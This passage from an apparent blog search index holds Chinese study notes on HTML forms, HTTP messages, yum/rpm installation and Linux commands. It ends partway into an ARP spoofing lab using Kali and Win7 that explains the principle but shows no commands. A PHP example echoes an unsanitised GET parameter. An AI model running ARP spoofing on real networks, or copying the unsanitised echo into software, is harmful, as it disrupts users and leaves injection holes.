            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端</title>
      <link href="/2022/09/02/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/"/>
      <url>/2022/09/02/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><p>Hyper Text Markup Language（超⽂本标记语⾔）</p><p>超⽂本包括：⽂字、图⽚、⾳频、视频、动画等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTML 5作为最新版本，提供了一些新的元素和一些有趣的新特性，同时也建立了一些新的规则。 这些元素、特性和规则的建立，提供了许多新的网页功能，如使用网页实现动态渲染图形、图表、 图像和动画，以及不需要安装任何插件直接使用网页播放视频等。   </span><br></pre></td></tr></table></figure><h2 id="前端代码与后端代码区别"><a href="#前端代码与后端代码区别" class="headerlink" title="前端代码与后端代码区别"></a>前端代码与后端代码区别</h2><p>前端代码可以被直接看⻅，后端⽆法看⻅源代码，HTML。JS</p><p>后端代码可以操作服务器，使⽤服务器的命令解释器，PHP,JAVA,ASP</p><p>⿊盒，⽩盒</p><p>代码审计，0day漏洞，</p><p>前端代码的作⽤，可能会含有敏感信息，查看⽹站的⽬录结构，</p><h2 id="HTML基本结构"><a href="#HTML基本结构" class="headerlink" title="HTML基本结构"></a>HTML基本结构</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&lt;! DOCTYPE html&gt;"></a>&lt;! DOCTYPE html&gt;</h4><p>声明位于⽂档中的最前⾯的位置，处于 标签之前。 </p><p>声明不是⼀个 HTML 标签；它是⽤来告知 Web 浏览器⻚⾯使⽤了哪种 HTML 版本。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230815112325696.png" alt="image-20230815112325696"></p><h4 id="meta"><a href="#meta" class="headerlink" title="&lt; meta&gt;"></a>&lt; meta&gt;</h4><p>设置⽹⻚的编码，SEO</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;是兄弟就来kan我&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="⽹⻚的基本标签"><a href="#⽹⻚的基本标签" class="headerlink" title="⽹⻚的基本标签"></a>⽹⻚的基本标签</h2><h4 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>修<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>yyds<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="换⾏标签"><a href="#换⾏标签" class="headerlink" title="换⾏标签"></a>换⾏标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⽔平线标签"><a href="#⽔平线标签" class="headerlink" title="⽔平线标签"></a>⽔平线标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片的位置&quot; alt=&quot;图片异常替代文字&quot; title=&quot;鼠标悬停文字&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="链接标签"><a href="#链接标签" class="headerlink" title="链接标签"></a>链接标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;path&quot; target=&quot;_self&quot;&gt;文本或者图像&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;path&quot; target=&quot;_blank&quot;&gt;文本或者图像&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="表格与表单"><a href="#表格与表单" class="headerlink" title="表格与表单"></a>表格与表单</h2><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230815171341246.png" alt="image-20230815171341246"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>第1个单元格的内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>第2个单元格的内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>第1个单元格的内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>第2个单元格的内容<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="跨列、跨⾏"><a href="#跨列、跨⾏" class="headerlink" title="跨列、跨⾏"></a>跨列、跨⾏</h4><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230815171422552.png" alt="image-20230815171422552"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table border=&quot;1px&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td colspan=&quot;3&quot;&gt;学生成绩&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td rowspan=&quot;2&quot;&gt;张三&lt;/td&gt;</span><br><span class="line">&lt;td&gt;语文&lt;/td&gt;</span><br><span class="line">&lt;td&gt;98&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;数学&lt;/td&gt;</span><br><span class="line">&lt;td&gt;95&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td rowspan=&quot;2&quot;&gt;李四&lt;/td&gt;</span><br><span class="line">&lt;td&gt;语文&lt;/td&gt;</span><br><span class="line">&lt;td&gt;88&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;数学&lt;/td&gt;</span><br><span class="line">&lt;td&gt;91&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method: 规定如何发送表单数据常用值,get,post</span><br><span class="line">在实际网页开发中通常采用post方式提交表单数据</span><br><span class="line">action: 表示向何处发送表单数据</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;1.php&quot;&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">名字：&lt;input name=&quot;name&quot; type=&quot;text&quot; &gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">密码：&lt;input name=&quot;pass&quot; type=&quot;password&quot; &gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;button&quot; value=&quot;提交&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;reset&quot; name=&quot;reset&quot; value=&quot;重填&quot;/&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><h4 id="⽂本框"><a href="#⽂本框" class="headerlink" title="⽂本框"></a>⽂本框</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type=&quot;text&quot;</span><br><span class="line">name：文本框名称(必填)</span><br><span class="line">value：文本框初始值</span><br><span class="line">size：文本框长度</span><br><span class="line">maxlength：文本框可输入最多字符</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;用户名&quot; size=&quot;30&quot;</span><br><span class="line">maxlength=&quot;20&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="密码框"><a href="#密码框" class="headerlink" title="密码框"></a>密码框</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type=&quot;password&quot;</span><br><span class="line">name：密码框名称(必填)</span><br><span class="line">size：密码框长度</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;pass&quot; size=&quot;20&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type=&quot;radio&quot;</span><br><span class="line">name：单选框名称(必填)，一组的名称需要相同</span><br><span class="line">checked：单选按钮选中状态</span><br><span class="line">value：单选框的值</span><br><span class="line">&lt;input name=&quot;g&quot; type=&quot;radio&quot; value=&quot;男&quot; checked /&gt;男</span><br><span class="line">&lt;input name=&quot;g&quot; type=&quot;radio&quot; value=&quot;女&quot; /&gt;女</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type=&quot;checkbox&quot;</span><br><span class="line">name：复选框名称(必填)，一组的名称需要相同</span><br><span class="line">checked：复选按钮选中状态</span><br><span class="line">value：复选框的值</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;sports&quot;/&gt;运动</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;talk&quot; checked /&gt;聊天</span><br><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;interest&quot; value=&quot;play&quot;/&gt;玩游戏</span><br></pre></td></tr></table></figure><h4 id="下拉列表框"><a href="#下拉列表框" class="headerlink" title="下拉列表框"></a>下拉列表框</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select:下拉列表框</span><br><span class="line">option：选项</span><br><span class="line">&lt;select name=&quot;列表名称&quot; size=&quot;行数&quot;&gt;</span><br><span class="line">&lt;option value=&quot;选项的值&quot; selected=&quot;selected&quot;&gt;…&lt;/option &gt;</span><br><span class="line">&lt;option value=&quot;选项的值&quot;&gt;…&lt;/option &gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><h4 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重置按钮</span><br><span class="line">&lt;input type=&quot;reset&quot; name=&quot;butReset&quot; value=&quot;reset按钮&quot;&gt;</span><br><span class="line">提交按钮</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;butSubmit&quot; value=&quot;submit按钮&quot;&gt;</span><br><span class="line">普通按钮</span><br><span class="line">&lt;input type=&quot;button&quot; name=&quot;butButton&quot; value=&quot;button按钮&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="联动"><a href="#联动" class="headerlink" title="联动"></a>联动</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=@$_GET[&#x27;id&#x27;];</span><br><span class="line">echo $id;</span><br><span class="line">if(!$id)&#123;</span><br><span class="line">echo &quot;please insert ?id=&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http协议</title>
      <link href="/2022/08/16/Linux/http%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/08/16/Linux/http%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="中间件服务器"><a href="#中间件服务器" class="headerlink" title="中间件服务器"></a>中间件服务器</h1><p>apache、nginx、tomcat</p><h1 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h1><p>不与数据库做交互，没有后端代码参与的网页</p><h1 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>mysql，Redis</p><h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><p>快</p><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>统⼀资源定位符（网址，全球唯⼀），用来告诉Web 容器，浏览器所请求资源（文件）的路径(URI)。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image015.gif" alt="文本框: http://127.0.0.1/pikachu-master/vul/burteforce/bf_form.php"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image018.jpg" alt="descript"></p><p>URL 编码 ,URL 所允许出现的字符是有限制的。</p><p>URL 中从path 开始只允许出现 A-Za-z0-9，半角减号（-），下划线（_），句点（.）,波浪号（~）。其他字符均会被URL 编码 （编码规则）</p><h1 id="请求报文分析"><a href="#请求报文分析" class="headerlink" title="请求报文分析"></a>请求报文分析</h1><p>HTTP 请求由请求行、请求头、请求正文三个部分组成</p><h2 id="请求行：HTTP-报文的第⼀行，由空格字符分成三部分"><a href="#请求行：HTTP-报文的第⼀行，由空格字符分成三部分" class="headerlink" title="请求行：HTTP 报文的第⼀行，由空格字符分成三部分"></a>请求行：HTTP 报文的第⼀行，由空格字符分成三部分</h2><p>请求方法：GET </p><p>资源路径：&#x2F;admin </p><p>协议&#x2F;版本：HTTP&#x2F;1.1</p><h2 id="请求头：从请求报文第⼆行开始到第⼀个空行为止之间的内容"><a href="#请求头：从请求报文第⼆行开始到第⼀个空行为止之间的内容" class="headerlink" title="请求头：从请求报文第⼆行开始到第⼀个空行为止之间的内容"></a>请求头：从请求报文第⼆行开始到第⼀个空行为止之间的内容</h2><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image020.jpg" alt="descript"></p><h2 id="请求正文：第⼀个空行开始以后的所有内容"><a href="#请求正文：第⼀个空行开始以后的所有内容" class="headerlink" title="请求正文：第⼀个空行开始以后的所有内容"></a>请求正文：第⼀个空行开始以后的所有内容</h2><p>POST传参</p><h1 id="响应报文分析"><a href="#响应报文分析" class="headerlink" title="响应报文分析"></a>响应报文分析</h1><p>响应报文由状态行、响应报头、响应正文三部分组成</p><h2 id="状态行：响应报文的第⼀行"><a href="#状态行：响应报文的第⼀行" class="headerlink" title="状态行：响应报文的第⼀行"></a>状态行：响应报文的第⼀行</h2><p>协议&#x2F;版本：HTTP&#x2F;1.1 </p><p>响应状态码：200 </p><p>描述短语：OK</p><h2 id="响应报头：响应报文第二行开始到第⼀个空行为止的所有内容，其中包含了关于HTTP响应的重要字段。"><a href="#响应报头：响应报文第二行开始到第⼀个空行为止的所有内容，其中包含了关于HTTP响应的重要字段。" class="headerlink" title="响应报头：响应报文第二行开始到第⼀个空行为止的所有内容，其中包含了关于HTTP响应的重要字段。"></a>响应报头：响应报文第二行开始到第⼀个空行为止的所有内容，其中包含了关于HTTP响应的重要字段。</h2><h2 id="响应报文：响应报文从第⼀个空行开始到最后的所有内容。-服务器返回资源的内容，即浏览器接-收到的HTML-代码"><a href="#响应报文：响应报文从第⼀个空行开始到最后的所有内容。-服务器返回资源的内容，即浏览器接-收到的HTML-代码" class="headerlink" title="响应报文：响应报文从第⼀个空行开始到最后的所有内容。 服务器返回资源的内容，即浏览器接 收到的HTML 代码"></a>响应报文：响应报文从第⼀个空行开始到最后的所有内容。 服务器返回资源的内容，即浏览器接 收到的HTML 代码</h2><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image022.jpg" alt="descript"></p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image024.jpg" alt="descript"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源安装</title>
      <link href="/2022/08/11/Linux/%E6%BA%90%E5%AE%89%E8%A3%85/"/>
      <url>/2022/08/11/Linux/%E6%BA%90%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="rpm"><a href="#rpm" class="headerlink" title="rpm"></a>rpm</h1><h3 id="源码包"><a href="#源码包" class="headerlink" title="源码包"></a>源码包</h3><p>C语⾔编写，不挑平台，任意的平台都可以安装，开发者发布的版本就是源码包</p><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>安卓系统，windows系统 </p><p>红帽系列，德班系列</p><p> .rpm .deb </p><p><code>RPM</code> ⼯具，命令字，</p><p><code>\</code>   转义</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213558316.png" alt="image-20230807213558316"></p><h3 id="rpm命令学习"><a href="#rpm命令学习" class="headerlink" title="rpm命令学习"></a>rpm命令学习</h3><p><strong>1、查看操作系统安装了那些程序</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213659394.png" alt="image-20230807213659394"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213711086.png" alt="image-20230807213711086"></p><p><strong>2、查看安装包的信息</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213736475.png" alt="image-20230807213736475"></p><p><strong>3、查看软件安装后命令字的位置</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213840815.png" alt="image-20230807213840815"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213852134.png" alt="image-20230807213852134"></p><p><strong>4、安装 -i安装 -v 显⽰安装信息 -h井号替代进度条</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213918404.png" alt="image-20230807213918404"></p><p><strong>5、rpm -e lftp 卸载</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807213947774.png" alt="image-20230807213947774"></p><h1 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h1><h3 id="yum-1"><a href="#yum-1" class="headerlink" title="yum"></a>yum</h3><p>软件存在依赖关系，yum解决了红帽系软件安装的依赖关系</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807214552905.png" alt="image-20230807214552905"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807214616452.png" alt="image-20230807214616452"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807214624485.png" alt="image-20230807214624485"></p><h3 id="本地源"><a href="#本地源" class="headerlink" title="本地源"></a>本地源</h3><p>安装包在本地硬盘上，让操作系统知道本地安装包 </p><p>⾃动挂载服务 systemctl restart autofs 重</p><p>启以后，服务会⾃动关闭，</p><p>systemctl enable autofs 加⼊开机启动 </p><p>vim &#x2F;misc&#x2F;cd</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807214726287.png" alt="image-20230807214726287"></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230807214736988.png" alt="image-20230807214736988"></p><h3 id="⽹络源"><a href="#⽹络源" class="headerlink" title="⽹络源"></a>⽹络源</h3><p>安装包在远程服务器上，让操作系统知道该去哪下载软件 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure><h1 id="本地源安装"><a href="#本地源安装" class="headerlink" title="本地源安装"></a>本地源安装</h1><p>要编辑本地的yum源并安装LibreOffice，你可以按照以下步骤进行操作：</p><p>打开终端，以管理员权限登录到系统。</p><p>进入yum源配置文件的目录，通常为<code>/etc/yum.repos.d/</code>。你可以使用以下命令进入该目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/yum.repos.d/</span><br></pre></td></tr></table></figure><p>创建一个新的yum源配置文件，例如<code>libreoffice.repo</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim libreoffice.repo</span><br></pre></td></tr></table></figure><p>在编辑器中，将以下内容添加到新的yum源配置文件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[libreoffice]</span><br><span class="line">name=LibreOffice Repository</span><br><span class="line">baseurl=http://download.documentfoundation.org/libreoffice/rpm/stable/7/x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://download.documentfoundation.org/libreoffice/rpm/doc/GPG-GPG-KEY</span><br></pre></td></tr></table></figure><p>保存并关闭文件。在vim编辑器中，你可以按下<code>Esc</code>键，然后输入<code>:wq</code>命令来保存并退出。</p><p>更新yum缓存，以便能够使用新的yum源：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum update</span><br></pre></td></tr></table></figure><p>现在，你可以使用yum安装LibreOffice了。运行以下命令进行安装：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libreoffice</span><br></pre></td></tr></table></figure><p>等待安装完成。安装完成后，你就可以通过菜单或命令行启动LibreOffice了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令</title>
      <link href="/2022/08/04/Linux/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/08/04/Linux/Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><blockquote><p>[root@localhost ~] #</p><p>[当前⽤⼾ 分隔符 主机名 家⽬录] 管理员权限</p><p><strong>#</strong> 管理员权限</p><p><strong>$</strong> 普通用户权限</p></blockquote><blockquote><p> ls — list </p><p> cd — change directory </p><p> cat—查看⽂件内容 </p><p> pwd—print working directory </p><p> Ctrl+l—-清屏</p></blockquote><blockquote><p>相对路径 </p><p>绝对路径[看起始路径是不是&#x2F;]</p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><blockquote><p>&#x2F;bin –binary —-⼆进制，存放了普通⽤⼾和管理员都可以执⾏的命令 </p><p>&#x2F;sbin—管理员可以执⾏的命令</p><p>&#x2F;dev—设备存放⽬录 </p><p>&#x2F;tmp—临时⽂件存放⽬录 </p><p>&#x2F;proc—内存信息 </p><p>&#x2F;boot–内核 </p><p>&#x2F;etc—配置⽂件⽬录 </p><p>&#x2F;home—普通⽤⼾的家⽬录 </p><p>&#x2F;root—root⽤⼾的家⽬录 </p><p>&#x2F;usr—软件的安装路径 </p><p>&#x2F;var—易变⽂件的存放⽬录，⽇志</p></blockquote><h1 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h1><blockquote><p>[TAB] —-补全命令字或者路径</p><p>history—-历史命令</p><p>touch—-创建空文件，更新时间标记</p><p>mkdir—-创建目录</p><p>cp—-copy   复制</p><p>rm—删除，-f强制删除，-r递归删除</p><p>mv—移动，剪切</p><p>echo—输出</p><p><code>&gt;&gt;</code>—输出重定向</p></blockquote><h1 id="统计命令学习"><a href="#统计命令学习" class="headerlink" title="统计命令学习"></a>统计命令学习</h1><blockquote><p>man</p><p><code>内部命令</code>    :解释器⾃带的命令字，cd，ls</p><p><code>外部命令</code>    :第三⽅软件安装好后带的命令字，例如python</p><p>man ls—–退出按一下<strong>q</strong></p><p>​            搜索参数，&#x2F;想要搜索的内容，n，向下查找，N，向上查找</p><p><img src="/Linux%E5%91%BD%E4%BB%A4.assets/image-20230801173810123.png" alt="image-20230801173810123"></p><p>date—输出当前时间 </p><p>​         输出如下格式的时间：2023-08-01，man帮助，format </p><p>more —百分⽐输出⽂件内容</p><p>less —可以按⾏阅读⽂档 </p><p>head —查看⽂件头，默认看10⾏ </p><p>tail —查看⽂件结尾，-f，追踪显⽰⽂件结尾，ctrl+c退出</p><p>grep —过滤⾏ -i忽略⼤⼩写 </p><p>​    grep  “过滤内容”  文件路径</p><p>awk —过滤列 </p><p>​           awk -F: ‘{print $1}’ &#x2F;etc&#x2F;passwd</p><p>​       -F分隔符 打印第⼀列 过滤列的⽂</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp断网攻击</title>
      <link href="/2022/07/04/Windows/arp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/"/>
      <url>/2022/07/04/Windows/arp%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="一、ARP断网攻击"><a href="#一、ARP断网攻击" class="headerlink" title="一、ARP断网攻击"></a>一、ARP断网攻击</h1><h3 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h3><p>原理：<strong>在局域网中，主机通信前必须通过ARP协议把IP地址转换为MAC地址，ARP欺骗就是通过伪造P地址与MAC地址的映射关系实现的一种欺骗攻击。因为局域网内的主机根据MAC地址进行通信，发送方检查其ARP缓存中是否已存储目标IP的MAC地址，否则它会广播发送ARP请求报文，只有目标IP的主机才会响应一个包含其MAC地址的ARP应答报文，发送方收到该应答后，立即更新自身的ARP缓存。攻击者可以发送虚假的ARP请求或应答报文，使得目标主机接收错误的IP和MAC绑定关系</strong></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707185740913-1695651084163-1695910408065.png" alt="image-20230707185740913"></p><h3 id="2-设置kali和win7的网络为net模式"><a href="#2-设置kali和win7的网络为net模式" class="headerlink" title="2.设置kali和win7的网络为net模式"></a>2.设置kali和win7的网络为net模式</h3><h3 id="3-先查看win7网络是否正常通信"><a href="#3-先查看win7网络是否正常通信" class="headerlink" title="3.先查看win7网络是否正常通信"></a>3.先查看win7网络是否正常通信</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707190718956-1695651084164-1695910405780.png" alt="image-20230707190718956"></p><h3 id="4-查看网关和mac地址"><a href="#4-查看网关和mac地址" class="headerlink" title="4.查看网关和mac地址"></a>4.查看网关和mac地址</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230707190844195-1695651084164-1695910403610.png" alt="image-20230707190844195"></p><p><img 